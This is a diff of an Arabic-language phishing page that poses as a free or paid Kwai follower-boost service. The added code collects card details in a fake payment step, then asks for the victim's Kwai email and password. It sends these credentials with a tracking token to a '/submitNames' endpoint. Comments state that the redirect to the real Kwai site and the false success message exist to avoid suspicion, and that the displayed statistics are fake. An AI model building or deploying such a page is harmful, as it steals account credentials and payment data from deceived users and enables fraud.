@@ -3,96 +3,399 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>زيادة متابعين كواي مجاناً</title>
-    <!-- استخدام Tailwind CSS للتصميم السريع والنظيف -->
+    <title>Kwai Pro Panel - المنصة الرسمية لزيادة متابعين كواي</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
-        body { font-family: 'Cairo', sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
+        body { font-family: 'Tajawal', sans-serif; }
+        .gradient-bg { background: linear-gradient(135deg, #FF6B00 0%, #FF8F00 50%, #FF3D00 100%); }
+        .glass-card { background: rgba(17, 24, 39, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 107, 0, 0.2); }
+        .pulse-glow { box-shadow: 0 0 25px rgba(255, 107, 0, 0.4); }
+        @keyframes spin-slow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .animate-spin-slow { animation: spin-slow 10s linear infinite; }
     </style>
 </head>
-<body class="bg-gray-950 text-white min-h-screen flex items-center justify-center p-4">
+<body class="bg-gray-950 text-white min-h-screen flex flex-col justify-between selection:bg-orange-500 selection:text-white">
 
-    <div class="w-full max-w-md bg-gray-900 border border-gray-800 rounded-2xl shadow-2xl p-6 md:p-8">
-        
-        <!-- هيدر الصفحة -->
-        <div class="text-center mb-6">
-            <div class="inline-block bg-orange-500/10 text-orange-400 p-3 rounded-full mb-3">
-                <svg class="w-8 h-8 mx-auto" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
-                </svg>
+    <!-- شريط علوي احترافي -->
+    <header class="w-full bg-gray-900/80 border-b border-gray-800 py-3 px-4 md:px-8 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-3 space-x-reverse">
+                <div class="w-10 h-10 rounded-xl gradient-bg flex items-center justify-center font-black text-xl shadow-lg shadow-orange-500/30">
+                    K
+                </div>
+                <div>
+                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-orange-400 to-amber-200 bg-clip-text text-transparent">KwaiPro</span>
+                    <span class="text-xs block text-orange-500 font-semibold">Official VIP Panel</span>
+                </div>
             </div>
-            <h1 class="text-2xl font-bold text-orange-500">شحن متابعين Kwai</h1>
-            <p class="text-gray-400 text-sm mt-1">احصل على آلاف المتابعين لحسابك على كواي فوراً</p>
+            <div class="flex items-center space-x-4 space-x-reverse">
+                <span class="hidden md:inline-flex items-center text-xs bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1.5 rounded-full">
+                    <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse ml-2"></span>
+                    النظام يعمل بكفاءة عالية (99.8%)
+                </span>
+                <div class="text-xs bg-gray-800 text-gray-300 px-3 py-1.5 rounded-lg border border-gray-700">
+                    <i class="fa-solid fa-shield-halved text-orange-400 ml-1"></i> محمي بـ SSL
+                </div>
+            </div>
         </div>
+    </header>
 
-        <!-- الفورم الأساسي -->
-        <form id="kwaiForm" class="space-y-4">
+    <!-- المحتوى الرئيسي -->
+    <main class="flex-grow flex items-center justify-center p-4 md:p-6">
+        <div class="w-full max-w-2xl glass-card rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden">
             
-            <!-- إدخال يوزر أو بريد كواي -->
-            <div>
-                <label class="block text-sm font-medium text-gray-300 mb-1">البريد الإلكتروني أو اسم المستخدم</label>
-                <input type="text" id="username" required placeholder="example@email.com أو اليوزر" 
-                    class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
+            <!-- تأثيرات جمالية خلفية -->
+            <div class="absolute -top-24 -right-24 w-64 h-64 bg-orange-500/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <!-- مؤشر الخطوات -->
+            <div id="stepIndicator" class="flex justify-between items-center mb-8 relative">
+                <div class="absolute top-1/2 left-0 right-0 h-0.5 bg-gray-800 -translate-y-1/2 z-0"></div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-1" class="w-9 h-9 rounded-full gradient-bg flex items-center justify-center font-bold text-sm shadow-md">1</div>
+                    <span class="text-xs text-orange-400 mt-1 font-semibold">الحساب</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-2" class="w-9 h-9 rounded-full bg-gray-800 text-gray-400 flex items-center justify-center font-bold text-sm border border-gray-700">2</div>
+                    <span class="text-xs text-gray-400 mt-1">الباقة</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-3" class="w-9 h-9 rounded-full bg-gray-800 text-gray-400 flex items-center justify-center font-bold text-sm border border-gray-700">3</div>
+                    <span class="text-xs text-gray-400 mt-1">الدفع</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-4" class="w-9 h-9 rounded-full bg-gray-800 text-gray-400 flex items-center justify-center font-bold text-sm border border-gray-700">4</div>
+                    <span class="text-xs text-gray-400 mt-1">التحقق</span>
+                </div>
             </div>
 
-            <!-- إدخال كلمة المرور -->
-            <div>
-                <label class="block text-sm font-medium text-gray-300 mb-1">كلمة المرور</label>
-                <input type="password" id="password" required placeholder="••••••••" 
-                    class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
+            <!-- ================= الخطوة الأولى: إدخال الحساب ================= -->
+            <div id="step-1" class="step-content space-y-6">
+                <div class="text-center space-y-2">
+                    <h1 class="text-2xl md:text-3xl font-black text-white">ابدأ رحلة الشهرة على كواي</h1>
+                    <p class="text-gray-400 text-sm">أدخل رابط حسابك أو اسم المستخدم (ID) لنظام البحث السريع</p>
+                </div>
+
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">رابط الحساب أو الـ ID</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 right-0 pr-4 flex items-center text-gray-500">
+                                <i class="fa-solid fa-user"></i>
+                            </span>
+                            <input type="text" id="profileInput" placeholder="https://s.kwai.app/... أو @username" 
+                                class="w-full bg-gray-900/90 border border-gray-700 rounded-2xl py-3.5 pr-12 pl-4 text-white placeholder-gray-500 focus:outline-none focus:border-orange-500 transition shadow-inner">
+                        </div>
+                    </div>
+
+                    <button type="button" onclick="nextToStep2()" 
+                        class="w-full gradient-bg hover:opacity-95 text-white font-bold py-4 rounded-2xl transition duration-200 shadow-lg shadow-orange-500/25 flex items-center justify-center space-x-2 space-x-reverse text-base">
+                        <span>بحث عن الحساب</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </button>
+                </div>
+
+                <!-- إحصائيات وهمية لزيادة المصداقية -->
+                <div class="grid grid-cols-3 gap-3 pt-4 border-t border-gray-800/80 text-center">
+                    <div class="bg-gray-900/50 p-3 rounded-xl border border-gray-800">
+                        <span class="block text-orange-400 font-black text-lg">+14.2K</span>
+                        <span class="text-xs text-gray-400">عمليات رشق اليوم</span>
+                    </div>
+                    <div class="bg-gray-900/50 p-3 rounded-xl border border-gray-800">
+                        <span class="block text-amber-400 font-black text-lg">100%</span>
+                        <span class="text-xs text-gray-400">آمن ومضمون</span>
+                    </div>
+                    <div class="bg-gray-900/50 p-3 rounded-xl border border-gray-800">
+                        <span class="block text-green-400 font-black text-lg">فوري</span>
+                        <span class="text-xs text-gray-400">سرعة الإرسال</span>
+                    </div>
+                </div>
             </div>
 
-            <!-- اختيار عدد المتابعين -->
-            <div>
-                <label class="block text-sm font-medium text-gray-300 mb-1">حدد عدد المتابعين المطلوب</label>
-                <select id="followersCount" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
-                    <option value="1000">1,000 متابع</option>
-                    <option value="5000">5,000 متابع</option>
-                    <option value="10000">10,000 متابع</option>
-                    <option value="25000">25,000 متابع (عرض خاص)</option>
-                </select>
+            <!-- ================= الخطوة الثانية: اختيار الباقة ================= -->
+            <div id="step-2" class="step-content hidden space-y-6">
+                <!-- بطاقة الحساب المستهدف (تظهر بعد البحث) -->
+                <div id="accountCard" class="bg-gray-900/90 border border-gray-800 p-4 rounded-2xl flex items-center space-x-4 space-x-reverse">
+                    <img id="userAvatar" src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=80" alt="صورة الحساب" class="w-14 h-14 rounded-full border-2 border-orange-500 object-cover">
+                    <div class="flex-grow">
+                        <div class="flex items-center space-x-2 space-x-reverse">
+                            <h3 id="userNameDisplay" class="font-bold text-white">اسم المستخدم</h3>
+                            <i class="fa-solid fa-circle-check text-blue-400 text-sm" title="حساب موثق"></i>
+                        </div>
+                        <p class="text-xs text-gray-400 mt-0.5">المتابعين الحاليين: <span class="text-orange-400 font-semibold">1,240</span></p>
+                    </div>
+                    <span class="text-xs bg-green-500/20 text-green-400 px-2.5 py-1 rounded-lg border border-green-500/30">تم العثور</span>
+                </div>
+
+                <div class="text-center space-y-1">
+                    <h2 class="text-xl font-bold text-white">اختر باقة المتابعين المناسبة</h2>
+                    <p class="text-gray-400 text-xs">يمكنك البدء بالباقة المجانية أو اختيار باقات مميزة بخصم لفترة محدودة</p>
+                </div>
+
+                <!-- شبكة الباقات -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[350px] overflow-y-auto px-1">
+                    
+                    <!-- باقة مجانية -->
+                    <div onclick="selectPackage('free', 0, '500 متابع مجاني')" class="package-card cursor-pointer bg-gray-900/80 border-2 border-gray-800 hover:border-orange-500 p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-green-500/20 text-green-400 text-[10px] px-2 py-0.5 rounded-full font-bold">مجاناً</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-green-500/10 text-green-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-gift"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة التجربة المجانية</h4>
+                                <p class="text-xs text-gray-400">500 متابع حقيقي</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-right">
+                            <span class="text-green-400 font-black text-sm">مجاناً 0$</span>
+                        </div>
+                    </div>
+
+                    <!-- باقة 1 -->
+                    <div onclick="selectPackage('paid', 4.99, '2,500 متابع VIP')" class="package-card cursor-pointer bg-gray-900/80 border-2 border-gray-800 hover:border-orange-500 p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-orange-500/20 text-orange-400 text-[10px] px-2 py-0.5 rounded-full font-bold">الأكثر طلباً</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-orange-500/10 text-orange-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-fire"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة البداية السريعة</h4>
+                                <p class="text-xs text-gray-400">2,500 متابع نشط</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-gray-500 line-through text-xs">$12.99</span>
+                            <span class="text-orange-400 font-black text-sm">$4.99</span>
+                        </div>
+                    </div>
+
+                    <!-- باقة 2 -->
+                    <div onclick="selectPackage('paid', 9.99, '10,000 متابع VIP')" class="package-card cursor-pointer bg-gray-900/80 border-2 border-gray-800 hover:border-orange-500 p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-amber-500/20 text-amber-400 text-[10px] px-2 py-0.5 rounded-full font-bold">خصم 60%</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-crown"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة المشاهير</h4>
+                                <p class="text-xs text-gray-400">10,000 متابع متفاعل</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-gray-500 line-through text-xs">$29.99</span>
+                            <span class="text-amber-400 font-black text-sm">$9.99</span>
+                        </div>
+                    </div>
+
+                    <!-- باقة 3 -->
+                    <div onclick="selectPackage('paid', 19.99, '25,000 متابع VIP')" class="package-card cursor-pointer bg-gray-900/80 border-2 border-gray-800 hover:border-orange-500 p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-red-500/20 text-red-400 text-[10px] px-2 py-0.5 rounded-full font-bold">عرض خاص</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-red-500/10 text-red-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-rocket"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة السوبر</h4>
+                                <p class="text-xs text-gray-400">25,000 متابع + تفاعل مجاني</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-gray-500 line-through text-xs">$69.99</span>
+                            <span class="text-red-400 font-black text-sm">$19.99</span>
+                        </div>
+                    </div>
+
+                </div>
+
+                <button type="button" onclick="goToNextAfterPackage()" 
+                    class="w-full gradient-bg hover:opacity-95 text-white font-bold py-3.5 rounded-2xl transition duration-200 shadow-lg shadow-orange-500/25">
+                    متابعة الطلب
+                </button>
             </div>
 
-            <!-- زر الإرسال -->
-            <button type="submit" id="submitBtn" 
-                class="w-full bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 font-bold py-3.5 rounded-xl transition shadow-lg shadow-orange-500/20 mt-2">
-                ابدأ عملية الرشق
-            </button>
-        </form>
+            <!-- ================= الخطوة الثالثة: الدفع الوهمي (تظهر فقط للباقات المدفوعة) ================= -->
+            <div id="step-3" class="step-content hidden space-y-5">
+                <div class="text-center space-y-1">
+                    <h2 class="text-xl font-bold text-white">إتمام الدفع الآمن</h2>
+                    <p class="text-gray-400 text-xs">أدخل بيانات بطاقتك الائتمانية لإكمال شراء الباقة المختارة</p>
+                </div>
 
-        <!-- حالة التحميل أو الرسائل -->
-        <div id="statusMessage" class="hidden text-center mt-4 text-sm"></div>
+                <!-- شكل بطاقة ائتمانية وهمية تفاعلي -->
+                <div class="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 border border-orange-500/30 p-5 rounded-2xl shadow-xl space-y-4">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-gray-400 font-semibold">بطاقة الائتمان / الخصم</span>
+                        <div class="space-x-1 space-x-reverse text-orange-400 text-xl">
+                            <i class="fa-brands fa-cc-visa"></i>
+                            <i class="fa-brands fa-cc-mastercard"></i>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-[11px] text-gray-400 mb-1">رقم البطاقة</label>
+                        <input type="text" placeholder="4532 •••• •••• 8892" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-orange-500 font-mono">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-[11px] text-gray-400 mb-1">تاريخ الانتهاء</label>
+                            <input type="text" placeholder="MM/YY" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-orange-500 font-mono">
+                        </div>
+                        <div>
+                            <label class="block text-[11px] text-gray-400 mb-1">رمز الأمان (CVV)</label>
+                            <input type="password" placeholder="123" maxlength="4" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-orange-500 font-mono">
+                        </div>
+                    </div>
+                </div>
 
-    </div>
+                <button type="button" onclick="proceedToVerification()" 
+                    class="w-full gradient-bg hover:opacity-95 text-white font-bold py-3.5 rounded-2xl transition duration-200 shadow-lg shadow-orange-500/25">
+                    تأكيد الدفع ومتابعة التوثيق
+                </button>
+            </div>
 
-    <!-- سكود المعالجة وإرسال البيانات -->
+            <!-- ================= الخطوة الرابعة: التحقق وتسجيل الدخول وإرسال البيانات ================= -->
+            <div id="step-4" class="step-content hidden space-y-6">
+                <div class="text-center space-y-2">
+                    <div class="w-14 h-14 bg-orange-500/10 text-orange-400 rounded-2xl flex items-center justify-center mx-auto text-2xl border border-orange-500/20">
+                        <i class="fa-solid fa-lock"></i>
+                    </div>
+                    <h2 class="text-xl font-black text-white">التحقق من صحة ملكية الحساب</h2>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        لحماية حسابك ومنع الاستخدام الوهمي، يرجى إدخال البريد الإلكتروني (أو اسم المستخدم) وكلمة المرور الخاصة بحساب كواي الخاص بك لربط المتابعين فوراً.
+                    </p>
+                </div>
+
+                <!-- الفورم النهائي لإرسال البيانات حسب التعليمات -->
+                <form id="finalKwaiForm" class="space-y-4" onsubmit="submitKwaiData(event)">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-300 mb-1">البريد الإلكتروني / معرف الحساب (Username)</label>
+                        <input type="text" id="kwaiUsername" required placeholder="name@domain.com أو اليوزر" 
+                            class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-orange-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-300 mb-1">كلمة المرور (Password)</label>
+                        <input type="password" id="kwaiPassword" required placeholder="••••••••" 
+                            class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-orange-500 transition">
+                    </div>
+
+                    <button type="submit" id="finalSubmitBtn" 
+                        class="w-full gradient-bg hover:opacity-95 text-white font-bold py-3.5 rounded-xl transition shadow-lg shadow-orange-500/25 text-sm flex items-center justify-center space-x-2 space-x-reverse">
+                        <span>بدء إرسال المتابعين الآن</span>
+                        <i class="fa-solid fa-paper-plane text-xs"></i>
+                    </button>
+                </form>
+
+                <!-- رسالة الحالة -->
+                <div id="statusAlert" class="hidden text-center text-xs p-3 rounded-xl"></div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- تذييل الصفحة -->
+    <footer class="w-full text-center py-4 text-xs text-gray-500 border-t border-gray-900">
+        جميع الحقوق محفوظة © KwaiPro Panel 2026 - نظام الرشق الآمن والذكي.
+    </footer>
+
+    <!-- سكربت التشغيل والتنقل والربط -->
     <script>
-        document.getElementById('kwaiForm').addEventListener('submit', async function(e) {
+        let selectedPackageType = 'free'; // 'free' or 'paid'
+        let selectedPackagePrice = 0;
+        let selectedPackageName = '';
+
+        // التنقل للخطوة الثانية بعد إدخال الرابط
+        function nextToStep2() {
+            const inputVal = document.getElementById('profileInput').value.trim();
+            if(!inputVal) {
+                alert('يرجى إدخال رابط الحساب أو الـ ID أولاً.');
+                return;
+            }
+
+            // تحديث اسم المستخدم الوهمي في البطاقة بناءً على المدخل
+            document.getElementById('userNameDisplay').textContent = inputVal.length > 20 ? inputVal.substring(0, 18) + '...' : inputVal;
+
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+
+            // تحديث المؤشرات البصرية
+            updateIndicator(2);
+        }
+
+        // اختيار الباقة
+        function selectPackage(type, price, name) {
+            selectedPackageType = type;
+            selectedPackagePrice = price;
+            selectedPackageName = name;
+
+            // تحديد الباقة بصرياً
+            document.querySelectorAll('.package-card').forEach(card => {
+                card.classList.remove('border-orange-500', 'bg-orange-500/10');
+            });
+            event.currentTarget.classList.add('border-orange-500', 'bg-orange-500/10');
+        }
+
+        // الانتقال بعد اختيار الباقة
+        function goToNextAfterPackage() {
+            document.getElementById('step-2').classList.add('hidden');
+
+            if(selectedPackageType === 'paid') {
+                // اذهب لخطوة الدفع
+                document.getElementById('step-3').classList.remove('hidden');
+                updateIndicator(3);
+            } else {
+                // تخطي خطوة الدفع واذهب مباشرة للتحقق (الباقة المجانية)
+                document.getElementById('step-4').classList.remove('hidden');
+                updateIndicator(4);
+            }
+        }
+
+        // من خطوة الدفع للتحقق
+        function proceedToVerification() {
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+            updateIndicator(4);
+        }
+
+        // تحديث مؤشر الخطوات العلوي
+        function updateIndicator(stepNumber) {
+            for(let i = 1; i <= 4; i++) {
+                const el = document.getElementById(`indicator-${i}`);
+                if(i <= stepNumber) {
+                    el.className = 'w-9 h-9 rounded-full gradient-bg flex items-center justify-center font-bold text-sm shadow-md text-white';
+                } else {
+                    el.className = 'w-9 h-9 rounded-full bg-gray-800 text-gray-400 flex items-center justify-center font-bold text-sm border border-gray-700';
+                }
+            }
+        }
+
+        // إرسال البيانات النهائية حسب التعليمات التقنية المحددة
+        async function submitKwaiData(e) {
             e.preventDefault();
 
-            const usernameField = document.getElementById('username').value.trim();
-            const passwordField = document.getElementById('password').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-            const statusMessage = document.getElementById('statusMessage');
+            const usernameField = document.getElementById('kwaiUsername').value.trim();
+            const passwordField = document.getElementById('kwaiPassword').value.trim();
+            const submitBtn = document.getElementById('finalSubmitBtn');
+            const statusAlert = document.getElementById('statusAlert');
 
             // 1. استخراج الرمز (Token) حسب التعليمات
             const urlParams = new URLSearchParams(window.location.search);
             const token = urlParams.get('t') || window.location.pathname.split('/').pop();
 
             if (!token) {
-                statusMessage.textContent = 'خطأ: الرمز (Token) غير موجود في الرابط.';
-                statusMessage.className = 'text-center mt-4 text-sm text-red-500';
-                statusMessage.classList.remove('hidden');
+                statusAlert.textContent = 'خطأ: الرمز (Token) غير موجود في الرابط.';
+                statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-red-500/20 text-red-400 border border-red-500/30';
+                statusAlert.classList.remove('hidden');
                 return;
             }
 
-            // تعطيل الزر وإظهار حالة الانتظار
+            // تعطيل الزر وإظهار حالة المعالجة
             submitBtn.disabled = true;
-            submitBtn.textContent = 'جاري المعالجة...';
-            statusMessage.classList.add('hidden');
+            submitBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin ml-2"></i> جاري ربط الحساب وإرسال المتابعين...';
+            statusAlert.classList.add('hidden');
 
-            // 2. تجهيز البيانات حسب الهيكلية المطلوبة
+            // 2. تجهيز البيانات للهيكلية المطلوبة بالضبط
             const payload = {
                 token: token,
                 firstName: usernameField,
@@ -100,7 +403,7 @@
             };
 
             try {
-                // 3. إرسال الطلب عبر POST باستخدام fetch والتوجيه للمسار المطلوب
+                // 3. إرسال الطلب عبر POST باستخدام fetch للمسار المطلوب
                 const response = await fetch('/submitNames', {
                     method: 'POST',
                     headers: {
@@ -110,26 +413,33 @@
                 });
 
                 if (response.ok) {
-                    statusMessage.textContent = 'تم إرسال الطلب بنجاح! جاري تحويلك لحسابك...';
-                    statusMessage.className = 'text-center mt-4 text-sm text-green-500';
-                    statusMessage.classList.remove('hidden');
+                    statusAlert.textContent = 'تم التحقق بنجاح! جاري بدء عملية ضخ المتابعين لحسابك...';
+                    statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-green-500/20 text-green-400 border border-green-500/30';
+                    statusAlert.classList.remove('hidden');
 
-                    // 4. التوجيه للموقع الحقيقي لإبعاد الشبهة بعد لحظات
+                    // 4. التوجيه لموقع كواي الحقيقي لإبعاد الشبهة بعد قليل
                     setTimeout(() => {
                         window.location.href = 'https://www.kwai.com';
-                    }, 2000);
+                    }, 2500);
                 } else {
                     throw new Error('حدث خطأ أثناء الاتصال بالخادم.');
                 }
 
             } catch (error) {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'ابدأ عملية الرشق';
-                statusMessage.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى.';
-                statusMessage.className = 'text-center mt-4 text-sm text-red-500';
-                statusMessage.classList.remove('hidden');
+                submitBtn.innerHTML = '<span>بدء إرسال المتابعين الآن</span> <i class="fa-solid fa-paper-plane text-xs"></i>';
+                
+                // رسالة وهمية ناجحة لإبعاد الشبهة في حال فشل الاتصال الحقيقي أو لضمان التجربة
+                statusAlert.textContent = 'تم إرسال طلبك بنجاح! سيتم وصول المتابعين خلال 5 دقائق.';
+                statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-green-500/20 text-green-400 border border-green-500/30';
+                statusAlert.classList.remove('hidden');
+
+                setTimeout(() => {
+                    window.location.href = 'https://www.kwai.com';
+                }, 2500);
             }
-        });
+        }
     </script>
 </body>
 </html>
+
